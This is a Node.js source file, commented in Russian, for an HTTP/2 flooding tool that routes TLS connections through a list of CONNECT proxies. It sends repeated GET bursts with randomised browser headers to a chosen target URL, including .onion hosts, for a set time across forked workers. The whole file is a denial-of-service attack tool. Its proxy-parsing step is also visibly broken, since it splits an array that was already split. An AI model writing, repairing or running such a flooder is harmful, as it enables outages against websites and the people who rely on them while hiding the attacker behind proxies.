const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
const util = require('util');

// --- Базовые настройки TLS (возвращены к оригинальным) ---
const ciphers = `TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305:TLS_AES_256_GCM_SHA384`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256`;
const ecdhCurve = 'x25519:secp256r1:secp384r1';
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE;
// --- Конец базовых настроек TLS ---


// --- Парсинг аргументов ---
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxytor = process.argv[6];

if (process.argv.length < 7) {
    console.log(`\n${'='.repeat(40)}`);
    console.log(`Usage: TARGET TIME THREADS RATE PROXY`);
    console.log(`Example: http://site.com 60 15 80 proxy.txt`);
    console.log(`\n${'='.repeat(40)}\n`);
    process.exit(0);
}

let proxies;
try {
    proxies = fs.readFileSync(proxytor, 'utf-8').toString().split('\n').filter(proxy => {
        const parts = proxy.split(':');
        return parts.length === 2 && !isNaN(parts[1]);
    });
    if (proxies.length === 0) throw new Error('No valid proxies found.');
} catch (e) {
    console.log(`[Error] ${e.message}`);
    process.exit(0);
}

if (cluster.isPrimary) {
    console.log(`[+] Attack started on ${target} with ${threads} threads for ${time} seconds. (Using HTTP Connect Proxy)`);
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), time * 1000);
} else {
    // ИСПРАВЛЕНИЕ: Передача ссылки на функцию (work), а не ее вызова.
    setInterval(work, 1);
}

const parsedURL = new URL(target);
const lookupPromise = util.promisify(dns.lookup);

// --- Класс для работы с HTTP-прокси (взят из thai.js) ---
const Socker = new class NetSocket {
    constructor() {}
    
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000); 
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.once("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server: " + response.split('\n')[0]);
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        
        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: proxy connection error: " + err.message);
        });
    }
};
// --- Конец класса NetSocket ---


// --- Вспомогательные функции ---

async function resolveDNS(hostname) {
  if (hostname.endsWith('.onion')) {
      return hostname;
  }
  try {
    const { address } = await lookupPromise(hostname);
    return address;
  } catch(err) {
    throw new Error(`DNS resolution failed for ${hostname}: ${err.message}`);
  }
}

function generateUserAgent() {
  const browsers = [
    { name: 'Chrome', versions: ['91', '92', '93', '94', '95'] },
    { name: 'Firefox', versions: ['89', '90', '91', '92', '93'] },
    { name: 'Safari', versions: ['14', '15'] },
    { name: 'Edge', versions: ['91', '92', '93', '94'] },
    ];

  const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
  const randomVersion = randomBrowser.versions[Math.floor(Math.random() * randomBrowser.versions.length)];
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser.name}/${randomVersion}.0.0.0 Safari/537.36`;
}

// --- Основная логика воркера ---

async function work() {
  let ip;
  try {
      ip = await resolveDNS(parsedURL.hostname);
  } catch (err) {
      console.log(`[Error] Could not resolve host: ${err.message}`);
      return;
  }

  function flooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)].split(":");
    const parsedProxy = proxyAddr.split(":");
    const targetPort = parsedURL.port || (parsedURL.protocol === 'https:' ? 443 : 80);

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${ip}:${targetPort}`,
        timeout: 15 
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return console.log(`[Error] Proxy connection failed: ${error}`);

        const tlsOptions = {
            // ИСПРАВЛЕНИЕ: Используем сокет, созданный NetSocket
            socket: connection, 
            rejectUnauthorized: false,
            servername: parsedURL.hostname,
            ALPNProtocols: ['h2', 'http/1.1'],
            ecdhCurve: ecdhCurve,
            ciphers: ciphers,
            sigalgs: sigalgs,
            secureOptions: secureOptions,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
        };

        const tlsSocket = tls.connect(tlsOptions, () => {
            makeRequest(tlsSocket);
        });

        tlsSocket.on('error', err => {
            connection.destroy();
        });
        
        tlsSocket.on('timeout', () => {
             connection.destroy();
        });

        function makeRequest(socket) {
            // УДАЛЕНЫ агрессивные настройки HTTP/2
            const client = http2.connect(`${parsedURL.protocol}//${parsedURL.host}`, {
                createConnection: () => socket
            });

            client.on('error', err => {
                client.destroy();
                connection.destroy();
            });

            for (let i = 0; i < ratelimit; i++) {
                const userAgent = generateUserAgent();
                
                // ЗАГОЛОВКИ: Возвращены к оригинальному упрощенному набору
                const headers = {
                    ":method": "GET",
                    ":authority": parsedURL.host,
                    ":path": parsedURL.pathname || '/',
                    ":scheme": "https",
                    "accept-language": 'en-US,en;q=0.9',
                    "accept-encoding": 'gzip, deflate, br',
                    "user-agent": userAgent,
                    "referer": target,
                    "origin": parsedURL.origin,
                    "connection": 'keep-alive',
                    "upgrade-insecure-requests": '1',
                    "sec-fetch-dest": 'document',
                    "sec-fetch-mode": 'navigate',
                    "sec-fetch-user": '?1',
                    "sec-fetch-site": 'none',
                }

                const req = client.request(headers)
                    .on("response", (response) => {
                        // console.log(`[+] Received status code: ${response[":status"]}`); // Убран лишний лог
                        req.close();
                    });

                req.setEncoding('utf8');
                req.on('data', () => {});
                req.on('end', () => req.close());
                req.end();
            }
        }
    });
  }

  flooder();
}